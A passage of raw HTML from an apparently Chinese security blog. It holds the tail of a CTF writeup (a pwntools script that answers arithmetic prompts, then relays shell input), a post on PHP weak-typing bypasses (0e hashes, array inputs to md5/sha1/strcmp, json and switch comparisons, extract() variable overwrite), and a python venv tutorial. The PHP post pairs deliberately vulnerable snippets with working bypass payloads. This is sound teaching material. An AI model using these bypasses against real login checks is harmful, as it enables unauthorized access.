class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    string = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    n1,operator,n2 = re.findall(<span class="string">r&#x27;(\d+|\+|\-|\*|\/)&#x27;</span>, string)</span><br><span class="line">    n1,n2 = <span class="built_in">int</span>(n1),<span class="built_in">int</span>(n2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        tmp = <span class="built_in">str</span>(n1 + n2)</span><br><span class="line">        p.sendline(tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="built_in">str</span>(n1 - n2)</span><br><span class="line">        p.sendline(tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    ss = <span class="built_in">input</span>()</span><br><span class="line">    p.sendline(ss.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(p.recvline())</span><br></pre></td></tr></table></figure>



<h2 id="👀-你的名字"><a href="#👀-你的名字" class="headerlink" title="👀 你的名字"></a>👀 你的名字</h2></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf-writeup/" title="ctf writeup">ctf writeup </a><span class="leancloud_visitors"></span><span>About 4426 words, 14 min 45 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a></h3></div><div class="post-content"><div class="card"><p><h2 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型:"></a>php弱类型:</h2><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等<br>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较值<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<p>$a&#x3D;”123”;@$b&#x3D;123;<br>a&#x3D;&#x3D;b; TRUE<br>a&#x3D;&#x3D;&#x3D;b; FALSE<br>0&#x3D;&#x3D;’ ‘; TRUE<br>‘1111’&#x3D;&#x3D;TRUE; TRUE<br>‘0’&#x3D;&#x3D;’false’; false<br>‘0’&#x3D;&#x3D;false;true<br>0x01&#x3D;1; FLASE<br>0x01&#x3D;TRUE; TRUE<br>[0]&#x3D;[NULL]; TRUE</p>
<p>NULL&#x3D;FALSE; TRUE<br>0e123465&#x3D;&#x3D;0e5555555; TRUE (0e绕过)</p>
<h3 id="案例1-md5弱比较"><a href="#案例1-md5弱比较" class="headerlink" title="案例1 md5弱比较"></a>案例1 md5弱比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span> <span class="number">0</span>e绕过(<span class="number">0</span>e 科学计数法)</span><br><span class="line">方法<span class="number">2</span> md5处理数组的时候会返回<span class="literal">null</span>的值，可以传递两个数组进去使得<span class="literal">null</span>==<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&quot;param1&quot;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=QNKCDZO&amp;param2=<span class="number">240610708</span> <span class="comment">//0e绕过 success</span></span><br></pre></td></tr></table></figure>

<h3 id="案例2-sha1弱类型"><a href="#案例2-sha1弱类型" class="headerlink" title="案例2 sha1弱类型"></a>案例2 sha1弱类型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span> <span class="number">0</span>e绕过(<span class="number">0</span>e 科学计数法)</span><br><span class="line">方法<span class="number">2</span> sha1处理数组的时候会返回<span class="literal">null</span>的值，可以传递两个数组进去使得<span class="literal">null</span>==<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] )</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;FLAG:&#x27;</span>.flag);</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Login first!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span> <span class="comment">//md5和sha1无法处理数组传入会返回NULL NULL</span></span><br></pre></td></tr></table></figure>

<h3 id="案例3-json相关"><a href="#案例3-json相关" class="headerlink" title="案例3 json相关"></a>案例3 json相关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">==号在比较字符串和数字的时候会将字符串转换成数字再进行比较</span><br><span class="line"><span class="string">&quot;1234abcd&quot;</span> == <span class="number">1234</span> <span class="literal">true</span></span><br><span class="line"><span class="string">&quot;123abc&quot;</span> == <span class="number">123</span> <span class="literal">true</span></span><br><span class="line"><span class="string">&quot;abcd&quot;</span> == <span class="number">0</span> <span class="literal">true</span></span><br><span class="line">字符串连续前几位是数字的话就会取这几位为转换的结果</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;adminasdasdasd&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$message</span>-&gt;key ==<span class="variable">$key</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;------&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?message=&#123;<span class="string">&quot;key&quot;</span>:<span class="number">0</span>&#125; <span class="comment">//&quot;adminasdasdasd&quot;字符串和数字进行比较的时候会转换成数字</span></span><br><span class="line"><span class="comment">//&quot;adminasdasdasd&quot;转换成数字为0</span></span><br></pre></td></tr></table></figure>

<h3 id="案例4-switch"><a href="#案例4-switch" class="headerlink" title="案例4 switch"></a>案例4 switch</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>在比较的时候会将字符串转换成数字，转换方法参考上面</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$i</span> =<span class="string">&quot;3name&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$i</span>)&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;this is two&quot;</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//echo flag switch case数字的时候强制把&quot;3name&quot;转换成数字进行比较，字符串开头包括什么数字就会转换成什么数字</span></span><br></pre></td></tr></table></figure>

<h3 id="案例5-strcmp"><a href="#案例5-strcmp" class="headerlink" title="案例5 strcmp"></a>案例5 strcmp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strcmp</span>(string1,string2)	strcmp将string1和string2转换为ascii码相减 若返回<span class="number">0</span>,代表两个字符串相等 ；若返回&lt;<span class="number">0</span> ,代表string1 小于 string2；若返回&gt;<span class="number">0</span>，代表string1 大于 string2</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp在比较字符串和数组的时候会返回<span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;asdasdad&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$password</span>)==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="案例6-in-array"><a href="#案例6-in-array" class="headerlink" title="案例6 in_array"></a>案例6 in_array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">3</span>, <span class="variable">$array</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果<span class="keyword">bool</span>(<span class="literal">true</span>) <span class="keyword">bool</span>(<span class="literal">true</span>) <span class="keyword">bool</span>(<span class="literal">true</span>) </span><br></pre></td></tr></table></figure>

<h3 id="案例7-array-search"><a href="#案例7-array-search" class="headerlink" title="案例7 array_search"></a>案例7 array_search</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="number">3</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;3&#x27;</span>, <span class="variable">$array</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>(<span class="number">0</span>) <span class="keyword">int</span>(<span class="number">1</span>) <span class="keyword">int</span>(<span class="number">3</span>) <span class="keyword">int</span>(<span class="number">3</span>)  </span><br></pre></td></tr></table></figure>

<h2 id="变量覆盖extract"><a href="#变量覆盖extract" class="headerlink" title="变量覆盖extract"></a>变量覆盖extract</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(); 将输入内容导入符号表，会存在变量覆盖</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$gift</span>))&#123;</span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$gift</span> == <span class="variable">$content</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;oh..&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?gift=&amp;content=</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><span class="leancloud_visitors"></span><span>About 978 words, 3 min 15 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a></h3></div><div class="post-content"><div class="card"><p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-venv</span><br></pre></td></tr></table></figure>

<h2 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv test_env</span><br></pre></td></tr></table></figure>

<p>会自动在用户目录创建一个test _env的虚拟环境目录</p>
<h2 id="开启-使用虚拟环境"><a href="#开启-使用虚拟环境" class="headerlink" title="开启&amp;使用虚拟环境"></a>开启&amp;使用虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/test_env/bin/activate</span><br></pre></td></tr></table></figure>

<p>开启虚拟环境后pip install安装的包会自动存放在&#x2F;test_env&#x2F;lib&#x2F;pythonx.x&#x2F;site-packages目录下面</p>
<h2 id="关闭虚拟环境"><a href="#关闭虚拟环境" class="headerlink" title="关闭虚拟环境"></a>关闭虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><span class="leancloud_visitors"></span><span>About 98 words, 19 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>